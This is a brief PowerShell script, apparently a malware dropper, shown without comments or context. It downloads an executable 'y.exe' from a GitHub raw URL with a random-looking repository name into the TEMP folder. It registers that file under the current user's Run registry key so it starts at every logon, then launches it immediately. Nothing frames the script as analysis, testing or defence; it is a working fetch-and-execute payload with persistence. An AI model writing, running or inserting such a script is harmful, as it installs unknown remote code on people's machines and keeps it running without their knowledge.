$url = "https://github.com/2nines/msOQ5TuuE60VuI3/raw/refs/heads/main/y.exe"
$filePath = "$env:TEMP\y.exe"
Invoke-WebRequest -Uri $url -OutFile $filePath
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$registryName = "Y"
Set-ItemProperty -Path $registryPath -Name $registryName -Value $filePath
Start-Process -FilePath $filePath
